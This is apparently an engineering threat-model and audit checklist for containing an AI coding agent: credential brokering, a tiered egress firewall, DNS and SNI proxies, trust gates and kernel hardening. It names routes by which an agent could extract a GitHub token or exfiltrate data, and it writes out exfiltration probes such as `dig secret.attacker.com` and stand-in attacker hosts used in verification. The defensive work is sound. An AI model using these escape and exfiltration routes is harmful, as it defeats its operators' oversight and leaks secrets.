# Agent containment — work items

This doc is a threat-model + audit. Items below are candidate work; triage into the
tracker as separate issues. None implemented yet.

## P0

- [x] **Gap 2 — fix the GitHub token leak (verified live).** (a) Stop writing the inline
      `password=<token>` helper into the workspace `.git/config` (`github-auth.ts`
      `configureGitCredentials`) — it puts the `ghp_…` token in plaintext on disk; routed
      the workspace through the brokered `shipit-git-credential` helper
      (`CONTAINER_CREDENTIAL_HELPER`) instead, matching the container's global gitconfig.
      (b) The broker is host-aware: the helper forwards `host=`/`protocol=` from stdin and
      the orchestrator's `getGitCredential` emits the token only for `github.com`
      (the only host ShipIt authenticates against), echoing nothing otherwise — the inline
      local helper used to *shadow* this with a host-blind echo. Tests in
      `github-auth.test.ts` prove `git credential fill` for a non-GitHub host returns no
      credentials, that github.com still resolves via the global helper (push/pull
      unaffected), and that no plaintext token lands in `.git/config`; host scoping is
      covered by `services/github-credential.test.ts` and `agent-shim/git-credential.test.ts`.
      (SHI-72)
- **Gap 2-R — credential broker is caller-blind (residual after SHI-72). [SHI-79]** Verified
      live 2026-06-03: `git credential fill` for `github.com` (or invoking
      `/usr/local/bin/shipit-git-credential get` directly) still returns the full `ghp_…`
      PAT to any code running in the session. The broker authorizes by host, not by caller,
      and the agent is indistinguishable from `git`. SHI-72 closed plaintext-at-rest and
      host-blindness but not on-demand extraction. Fix is defense-in-depth (SHI-79):
  - [x] **Short-lived, repo-scoped-token *mechanism* (highest leverage).** `GitHubAppTokenMinter`
        (`github-app-token.ts`) mints single-repo-scoped GitHub App installation tokens
        (`contents:write`, `pull_requests:write`, `metadata:read`; cached with a 5-min refresh
        margin; RS256 JWT via `node:crypto`). The broker prefers it
        (`getRepoScopedGitCredential` in `services/github.ts`, wired through
        `GitHubAuthManager.mintRepoScopedToken` and the `/api/sessions/:id/git/credential`
        route), falling back to the PAT when no App is configured / mint fails / repo unknown.
        Gated on `GITHUB_APP_ID` + `GITHUB_APP_PRIVATE_KEY`; ships dark until an operator opts
        in. Tests: `github-app-token.test.ts`, `services/github-credential.test.ts`.
  - [ ] **Operator GitHub App infra** — register the App, install on repos, per-user/-org
        installation discovery, private-key secret management/rotation. Until then the
        mechanism is inert (PAT fallback).
  - [ ] **Per-turn revocation** (`DELETE /installation/token`) to shrink the live window
        below the 1h TTL floor without breaking the post-turn debounced auto-push.
  - [ ] **Remove the PAT broker path** once a GitHub App is mandatory.
  - [ ] **Out-of-process git** — push/pull/fetch from the orchestrator host so the token
        never enters the container (the other listed mitigation; larger, separate).
- **Gap 1 — outbound egress control (SHI-90).** Full design in
  [egress-control.md](./egress-control.md). Enforcement is a network-layer gateway
  middlebox (the `HTTP_PROXY` env-var proxy is not a real control — a raw socket bypasses
  it). Delivered as **one PR, sequential commits A→B→C, each independently green**.

  **Merged (SHI-90 PR #1301):**
  - [x] Allowlist matcher (`egress-allowlist.ts` + test) — base + `SESSION_EGRESS_ALLOWLIST`
        + live MCP hosts; suffix matching rejects look-alikes. Reused by Tier C.
  - [x] The interim explicit `HTTP_PROXY` proxy was reverted before merge (non-enforcing;
        superseded by the netns-sidecar enforcement below).

  **Architecture resolved (egress-control.md):** enforcement is installed **inside the
  agent's own netns** by privileged orchestrator-launched sidecars
  (`--network container:<agent> --cap-add NET_ADMIN`) — no separate network / gateway /
  routing. SHI-31's non-root agent makes the Tier C owner-match exemption unambiguous.

  **To build (the actual control):**
  - **Tier A** — iptables default-deny (`OUTPUT DROP`) + `ipset` allow-set installed in the
    agent netns by a short-lived sidecar; allow-set = resolved FQDNs + `gh api meta` CIDR
    (resolve-before-deny ordering), `example.com`-must-fail self-test.
    - [x] Allow-set logic core (`egress-firewall.ts` + test): `gh api meta` CIDR
          parse/dedupe, ipset member composition + validation, concrete resolve-host list.
    - [x] Installer script + sidecar image (`docker/egress-sidecar/init-firewall.sh`,
          `docker/Dockerfile.egress-sidecar`): resolve-before-deny, lo/established/DNS +
          local-bridge-subnet allows, ipset match, `OUTPUT DROP`, `example.com`-must-fail
          self-test (fail-closed).
    - [x] Orchestrator wiring (`egress-firewall-install.ts` + test): cached+fallback
          `api.github.com/meta` fetch, `buildTierAEgressInputs`, `installEgressFirewall`
          (runs the sidecar in the agent netns with `NET_ADMIN`, fail-closed on non-zero).
          Hooked into `createContainer` after start / before ready; gated on
          `SESSION_EGRESS_ENFORCE=1` (default OFF) with `SESSION_EGRESS_SIDECAR_IMAGE`.
    - [x] **Verified on a live host (2026-06-15, dogfood container-mode orchestrator).**
          All three tiers enabled (`SESSION_EGRESS_ENFORCE/DNS/PROXY=1`), sidecar rebuilt,
          fresh session. Tier A floor holds: a raw socket to a non-allowlisted host on a
          NON-redirected port (80, 4444) times out (OUTPUT DROP); a literal-IP `:443`
          (`192.0.2.1`) and a raw `:443` connect both land on the SNI proxy and are
          `deny: no SNI` (cannot exfil — TCP connects to the proxy, which refuses to splice
          without a valid allowlisted SNI); Tier B refuses `data.attacker-example.com`
          (EREFUSED) while `api.anthropic.com`/`registry.npmjs.org` resolve and reach (404/200);
          `corepack`/`pnpm` reached `registry.npmjs.org` through egress. Deploy wiring
          (`deployment/vps`) to build the image is part of enabling.
  - **Tier B** — controlled DNS resolver (dnsmasq) in the agent netns: forwards only
    allowlisted domains (closes DNS tunneling — `dig secret.attacker.com` is refused) and
    pins resolved IPs into the Tier A ipset (kills stale-IP breakage). Own flag
    `SESSION_EGRESS_DNS=1` (requires `SESSION_EGRESS_ENFORCE=1`), default OFF.
    - [x] Config generation (`egress-dns.ts` + test): per-domain `server=`/`ipset=`, no
          default upstream, internal-names → Docker DNS, resolver `user=` for owner-match.
    - [x] Resolver runner + image (`run-resolver.sh`, `dnsmasq` + `egressdns` uid 911 in
          `Dockerfile.egress-sidecar`).
    - [x] Installer DNS-lock rules (`init-firewall.sh`, gated on `EGRESS_DNS_RESOLVER_UID`):
          block agent→Docker-DNS, allow only the resolver uid's upstream :53; DNS-independent
          literal-IP self-test (works in both tiers).
    - [x] Orchestrator wiring (`egress-dns-install.ts` + test): `buildResolverConfigB64`,
          `launchEgressResolver` (long-lived sidecar in agent netns, labeled
          `shipit-parent-session` so existing cleanup tears it down), agent `--dns 127.0.0.1`,
          resolver-uid threaded to the installer; sequenced after the Tier A install.
    - [x] **Verified on a live host — found + fixed two fatal bugs (the predicted
          fix-cycle).** First host run came back ❌ (DNS dead for the agent); the diagnosis
          surfaced two independent root causes, both now fixed:
          - **Bug 1 — agent never reached the resolver.** On a user-defined Docker network,
            the container `--dns 127.0.0.1` option does NOT set the agent's resolv.conf
            nameserver — Docker keeps `127.0.0.11` (its embedded resolver) as the nameserver
            and demotes `--dns` to a mere upstream. Tier A drops the agent→127.0.0.11, so the
            agent had no working resolver. Fix: drop the `Dns` override and instead REDIRECT
            the agent's DNS (`dst 127.0.0.11:53`) into the in-netns dnsmasq at the iptables
            layer (`install_dns_redirect` in `init-firewall.sh`, gated on the resolver uid).
          - **Bug 2 — resolver was SIGKILLed ~1s after launch.** The resolver carried only
            `shipit-parent-session=<sid>`, which the compose pre-start sweep
            (`killStaleContainers`) matches and `rm -f`s. Fix: stamp a distinct
            `EGRESS_RESOLVER_LABEL` (`shipit-egress-resolver=<sid>`) on the resolver and
            exclude it from the sweep (keeping the parent-session label for destroy-time
            cleanup). See `egress-dns-install.ts`, `container-lifecycle.ts`, `service-manager.ts`.
    - [x] **Re-verified on a live host after the fix — PASS, non-vacuously.** Rebuilt
          `shipit-egress-sidecar`, both flags on, fresh session: allowlisted names resolve
          (anthropic/npm/github) AND `npm`/`git` reach their hosts AND a real agent turn
          round-trips, while `data.attacker.com` → fast refuse, `@8.8.8.8` → blocked, the
          literal-IP Tier A floor holds, and the resolver survives the compose stale-sweep.
          Both nat-REDIRECT (Bug 1) and the resolver label exclusion (Bug 2) confirmed in
          the live agent netns. Sidecar build context is `docker/` (the `COPY` paths are
          `egress-sidecar/*`): `docker build -f docker/Dockerfile.egress-sidecar -t shipit-egress-sidecar:dev docker/`.
    - [x] **Coupled the resolver's internal-name allowlist to `SHIPIT_HOST` (host-verify
          follow-up).** The re-verify surfaced a third, latent issue: the worker→orchestrator
          callback host (`SHIPIT_HOST`) is derived from `SHIPIT_ORCHESTRATOR_HOST || os.hostname()`,
          but the Tier B resolver allowlist (`orchestratorInternalNames`) read ONLY
          `SHIPIT_ORCHESTRATOR_HOST`. When unset (the dev compose), `SHIPIT_HOST` was still
          set to `os.hostname()` but dnsmasq allowlisted nothing → the callback channel broke
          under Tier B. Fixed by deriving both from one shared `orchestratorCallbackHost()`
          (`egress-dns-install.ts`), so they can't diverge, AND adding
          `SHIPIT_ORCHESTRATOR_HOST=shipit`/`SHIPIT_ORCHESTRATOR_FALLBACK_HOSTS=shipit` to the
          dev compose for prod parity (prod already sets them).
  - **Tier C** — transparent SNI proxy for hostname-level HTTPS policy (closes the CDN
    co-tenancy gap: an allowlisted host and a non-allowlisted host on one CDN IP are
    indistinguishable to the ipset, but their SNI differs). Own flag
    `SESSION_EGRESS_PROXY=1` (requires Tier B + A), default OFF. **One PR, built in
    stages (C1 enforcement, then C2 allow-once UX).**
    - [x] **C1 — SNI-peek proxy + enforcement.** Tiny dependency-free Go binary
          (`docker/egress-sidecar/sni-proxy`, multi-stage build into the existing sidecar
          image) that peeks the ClientHello SNI (cleartext — NO decryption / CA injection,
          E2E TLS preserved) via crypto/tls's own parser, matches the allowlist (mirrors
          `egress-allowlist.ts`), and splices-or-rejects. Installer REDIRECTs the agent's
          :443 to it (`init-firewall.sh` `install_sni_redirect`, gated on `EGRESS_PROXY_UID`;
          needs `route_localnet` since the original dst is external). Orchestrator launch +
          flag + allowlist composition in `egress-proxy-install.ts`; wired in
          `container-lifecycle.ts` after the resolver; stale-sweep exclusion via
          `EGRESS_PROXY_LABEL`. Proxy runs as a dedicated uid (912) with NO `NET_ADMIN`
          (least privilege; only the installer needs it). Phase-2 identity-validation seam
          (`validateIdentity`) in place. Unit-tested in `egress-proxy-install.test.ts`.
    - [x] **C2 — allow-once / add-to-allowlist inline card.** Deny-fast at the proxy → the
          proxy queries the orchestrator decision endpoint (`GET /api/egress/decision`,
          `EGRESS_PROXY_DECISION_URL`) → orchestrator emits a persisted `EgressPromptCard`
          (full side-channel card pattern: `emitChatCard`, `PersistedEgressPrompt` +
          `egress_prompt` column + migration, `updateEgressPromptCard`, `CARD_MESSAGE_FIELDS`,
          history round-trip + guard tests) → user clicks Allow once / Add / Deny
          (`egress_decision` WS) → per-session policy (`egress-policy.ts`) flips allow → the
          proxy's next query (short negative cache) returns allow → the agent's retry
          succeeds. Card dedup per (session, host); resolutions persist + rehydrate.
          Phase-2 `validateIdentity` seam already in the proxy. **Scope note:** the allow
          decision was per-session in-memory; durable cross-restart persistence + an editor
          now ship (the Settings-UI item below — `add` writes through to the durable global
          allowlist and `egress-policy` reconciles against it via an injected durable source);
          the card record itself persists. Under Tier B a
          brand-new host is blocked at DNS first, so the card primarily covers the CDN/IP-
          reuse case — a proactive DNS-layer trigger for brand-new hosts is a follow-up.
    - [x] **Verify on a live host** (rebuild the sidecar with the Go binary, all three
          flags on): an allowlisted SNI splices through; a non-allowlisted SNI to an
          allowlisted IP is rejected (CDN co-tenancy); legit npm/git/anthropic unaffected;
          the proxy survives the compose stale-sweep.
          - **Re-verified ✅ on main `2626bc26` — Tier C works, trustworthy.** Every
            previously-failing check now passes: `route_localnet=1`; npm/git HTTPS + agent
            turn all succeed; a bad SNI to an allowlisted IP fast-resets (rc 35) and the
            proxy logs `deny: evil.example.com` (CDN co-tenancy gap closed); the allow-once
            card emits via the real proxy path (guard now passes the proxy's `?session=`
            decision query); approval flips allow-once and the retry forwards end-to-end;
            the decision endpoint is usable yet still cannot grant (WS-only). Proxy keeps
            uid 912 / no `NET_ADMIN` / both labels.
          - First live-host round found **three defects, fixed and merged (#1358)**:
            1. **route_localnet never set** — the NET_ADMIN-only installer's `/proc/sys`
               is read-only (EROFS), so `echo 1 >`/`sysctl -w` failed silently and the
               REDIRECT couldn't route to loopback. Fixed least-privilege: set
               `net.ipv4.conf.all.route_localnet=1` as a namespaced `HostConfig.Sysctls`
               on the **agent container** at creation (it owns its netns), gated on Tier C;
               `install_sni_redirect` now only read-verifies + warns.
            2. **Tier A `-P OUTPUT DROP` dropped the REDIRECT'd :443** — after nat REDIRECT
               the dst is `127.0.0.1:$PROXY_PORT` but oif isn't `lo` at filter/OUTPUT, so
               `-o lo ACCEPT` missed it. Added an explicit
               `-p tcp -d 127.0.0.1 --dport $PROXY_PORT -j ACCEPT` before the DROP policy.
            3. **Guard 403'd the proxy's own decision query** — `/api/egress/decision`
               carries the session as `?session=`, but §3 read it from the path → `null` →
               403 (card never emitted). §3 now falls back to the `?session=` query param
               (still the caller's own session). Test gap closed in `api-container-guard.test.ts`.
    - [x] **MCP-hosts + operator-extras plumbing** (shared with Tier B): one composition
          seam (`composeEgressExtraHosts` in `egress-allowlist.ts`) merges
          `SESSION_EGRESS_ALLOWLIST` + live MCP hosts (`credentialStore`) + the durable user
          allowlist, threaded via `resolveEgressConfig` (built in `index.ts`/`app-di`) into
          BOTH `buildResolverConfigB64` (Tier B `extraDomains`) and `buildProxyAllowed`
          (Tier C `extraHosts`) at container start — so the resolver's pinned set and the
          proxy's SNI allowlist can never drift. Unit-tested in `egress-allowlist.test.ts`.
  - [x] **Settings UI** (its own Settings → **Network** tab) — default-on global containment
        toggle (fail-secure: a missing global setting resolves to Contained), per-session
        containment override (Inherit / Contained / Open), and a **first-class allowlist
        editor**: it renders the full **effective** allowlist with **provenance** (built-in /
        operator / MCP / user-added, via `GET /api/egress/allowlist` + `buildEffectiveAllowlist`).
        **Built-in defaults are overridable** — removable/editable, with a **"Restore defaults"**
        action (`POST /api/egress/defaults/restore`); a removed default is recorded in the
        reserved `__suppressed_defaults__` scope and filtered out of the resolver/proxy `base`
        so it's actually closed. Only **operator** + **MCP** rows stay read-only ("Also allowed").
        User entries are add/remove/edit-able at global OR per-session scope. Durable store
        (`EgressAllowlistStore` — `egress_allowlist` + `egress_settings` tables, DB
        migration) feeds the per-session containment gate + the composition seam at
        container start; the global toggle / per-session override govern whether a session
        is contained (Open mode skips the firewall install). "Add to allowlist" (the Tier C
        card's `add`) now persists to the durable global allowlist AND live-reloads the
        running session's resolver + proxy (`egress-reload.ts` → `containerManager.reloadEgress`)
        so a brand-new host resolves (DNS + dnsmasq `ipset=` auto-pin) and is SNI-permitted
        without a container restart. Browser-only routes (`api-routes-egress.ts`:
        `GET/PUT /api/egress/settings`, `POST/DELETE /api/egress/hosts`,
        `GET/PUT /api/egress/session/:id`) carry NO `containerAccessible` flag, so SHI-129's
        default-deny protects them (golden route-table unchanged — no new container route).
        Client: `egress-store.ts` (Zustand) + `SettingsEgress.tsx` (Advanced tab) +
        `egress_settings` SSE sync. Tests: store, routes, reload seam, WS write-through,
        client store + component. **Reload swap verified on a live host (2026-06-15).** On a
        running contained session, `https://example.com` was blocked (Tier B NXDOMAIN, rc=6);
        `POST /api/egress/hosts {host:".example.com", scope:<sessionId>}` returned 200 and
        triggered `reloadEgress` → the proxy sidecar was relaunched (`13→14` allowlist entries)
        and the resolver re-pinned, while the **agent container was NOT restarted** (same
        container id + StartedAt); `https://example.com` then returned 200 with no restart.
        The reload also carried `identityRules` through — the relaunched proxy kept `1 identity
        rule(s)` and still denied `attacker.s3.amazonaws.com` (rc=35).
- [ ] **Gap 1 — identity-validating proxy (Phase 2)** for allowlisted multi-tenant hosts so
      an approved API can't be used to upload into an attacker's account. Builds on the
      Tier C proxy hook.
    - [x] **Proxy-side enforcement (`sni-proxy/main.go`).** `validateIdentity` implemented:
          SNI-scoped tenant rules from a new `EGRESS_PROXY_IDENTITY_RULES` env var (JSON
          `[{"host":".s3.amazonaws.com","identities":["my-bucket"]}]`). Extracts the tenant
          prefix from the SNI (virtual-hosted style), permits only approved identities, denies
          the un-scoped apex (path-style) by default, most-specific rule wins. NO TLS
          decryption — header/path identity is explicitly out of scope (documented in
          egress-control.md "Phase 2"). Unit-tested in `sni-proxy/main_test.go`
          (`go test`/`gofmt`/`go vet` green; binary builds via the sidecar Dockerfile).
    - [x] **Orchestrator wiring.** `composeEgressIdentityRules` (`egress-allowlist.ts`)
          parses/validates the operator `SESSION_EGRESS_IDENTITY_RULES` (+ a per-session
          `durableRules` hook for a future editor) into the proxy's canonical JSON; threaded
          through `resolveEgressConfig` → `ResolvedEgressConfig.identityRules` →
          `launchEgressProxy` as `EGRESS_PROXY_IDENTITY_RULES` (mirroring `EGRESS_PROXY_ALLOWED`),
          and carried through `reloadEgressSidecars` so a live allowlist reload doesn't drop
          identity scoping. Fail-open ("" → no scoping) since identity rules are additive over
          the host allowlist. A shared `ResolvedEgressConfig` type now backs the ~5 wiring sites
          (was a duplicated literal). Unit-tested in `egress-allowlist.test.ts` (compose/parse/
          normalize/dedup/fail-open/durable-merge) + `egress-proxy-install.test.ts` (env passed
          when set, omitted when ""). **Follow-up:** no per-session identity SOURCE is wired yet
          (only the operator-global env), so today every contained session gets the same rules;
          a per-session editor would feed `durableRules`.
    - [x] **Verified on a live host (2026-06-15, dogfood container-mode orchestrator).**
          With `SESSION_EGRESS_IDENTITY_RULES=[{"host":".s3.amazonaws.com","identities":["my-bucket"]}]`:
          the env reached the proxy as `EGRESS_PROXY_IDENTITY_RULES` (W); `my-bucket.s3.amazonaws.com`
          spliced through to real S3 (403, rc=0) (I1); `attacker.s3.amazonaws.com` (I2) and the
          path-style apex `s3.amazonaws.com` (I3) were both fast-reset (rc=35) — same allowlisted
          host/IP, different SNI tenant → denied; proxy logged `deny: identity not permitted for …`
          for both and nothing for the approved bucket (I4); a non-multi-tenant allowlisted host
          (`registry.npmjs.org`) was unaffected (200) (R); and a malformed `SESSION_EGRESS_IDENTITY_RULES`
          failed OPEN — orchestrator warned, the proxy got no `EGRESS_PROXY_IDENTITY_RULES`
          (`0 identity rule(s)`), and both tenants spliced (F).
          **Operational finding:** the prebuilt `shipit-egress-sidecar:dev` image predated the
          Phase-2 commit (`c04a5922`), so the *old* binary silently spliced `attacker.s3` through
          (no `validateIdentity`, and its startup log lacked the `identity rule(s)` segment). The
          runbook's "rebuild the sidecar from `main`" prerequisite is load-bearing — without it
          identity scoping is inert. Root cause: NO build path rebuilt the egress sidecar — it was
          built ONLY by a manual `docker build`, so a `docker/egress-sidecar/` change silently
          lagged `main` (here, `dev.sh` was run right before the verify but left the sidecar stale).
          **Fixed (2026-06-15):** added a build-only `egress-sidecar` service to both
          `docker/local/dev/compose.yml` (→ `shipit-egress-sidecar:dev`) and
          `deployment/vps/docker-compose.yml` (→ `shipit-egress-sidecar:prod`), and wired it into
          both `docker/local/dev.sh` and `deployment/vps/deploy.sh` build commands, so every dev
          boot / prod deploy rebuilds the sidecar in lockstep with `main`. Enforcement stays
          default-OFF until an operator sets `SESSION_EGRESS_ENFORCE=1` + `SESSION_EGRESS_SIDECAR_IMAGE`.

## P1

- [x] **Gap 3 — per-repo trust gate (shipped, docs/178).** Defers `agent.install` and
      compose `command:`/`build:` on first open of an untrusted remote until the user
      accepts via `RepoTrustBanner` (`POST /api/repos/trust`); decision persisted per
      remote in `RepoStore` (`trusted` column, `isTrusted()`/`setTrusted()`); warm-pool
      pre-install gated; ShipIt-created template repos trusted by construction.
      (`service-manager-setup.ts`, `docs/178-repo-trust-gate`)

## P2

- [ ] **Gap 6 — read-only mounts.** Downgrade `/uploads` (and `/credentials` after
      first-turn provisioning) to `:ro` where the agent has no legitimate write need.
- [x] **Gap 5 — kernel-tier hardening (SHI-97, shipped default-OFF).** Three env-gated
      controls in `container-hardening.ts`, applied in `container-lifecycle.ts`:
      - [x] **gVisor (`runsc`)** — decision **adopt as operator opt-in, default `runc`**
            (host must register the runtime; real cost on the npm/file-watch workload, so
            it's the operator's call). `SESSION_RUNTIME=runsc` → `HostConfig.Runtime`.
      - [x] **Custom seccomp profile** — `docker/seccomp/session-worker.json`, default-deny
            allowlist derived from Docker's default and tightened (denies `ptrace`,
            `process_vm_*`, `kcmp`, `userfaultfd`, `perf_event_open`, `bpf`; mount/ns/module
            families stay cap-gated). Applied via `SESSION_SECCOMP=1` (Docker default applies
            otherwise — never `unconfined`); fail-closed on a bad profile. Allowed set
            documented in plan.md + the profile header.
      - [x] **ReadonlyRootfs** — `SESSION_READONLY_ROOTFS=1` → `ReadonlyRootfs: true` + tmpfs
            for `/tmp` (exec), `/run`, `/home/shipit` (exec). Reuses SHI-31's writable-path
            enumeration; the persistent mounts (/workspace, /credentials, /uploads,
            /dep-cache) stay writable. Entrypoint re-creates credential symlinks into the
            tmpfs HOME (`SHIPIT_READONLY_HOME=1`). Distinct from SHI-45's `:ro` bind mounts.
      - [x] Unit tests (`container-hardening.test.ts` + HostConfig wiring in
            `session-container.test.ts`); regression-guards CapDrop/CapAdd/no-new-privileges.
      - [ ] **Live-host verification** before enabling any flag in prod (seccomp + ro-rootfs
            first — no host prereq; gVisor where the host registers `runsc`).

## Cross-cutting

- [x] **Gap 4 — untrusted-input lens.** Treat uploaded files, cloned-repo content, web
      fetches, and MCP tool returns as untrusted; fold into the egress/trust work and
      apply to future input surfaces. General mechanism shipped in SHI-98 — a reusable
      provenance envelope (`untrusted-input.ts`) applied to brokered file/upload content
      plus a system-prompt rule covering all four surfaces; SHI-85 enrolls issue text.
      Full design: `docs/201-untrusted-input-lens`.
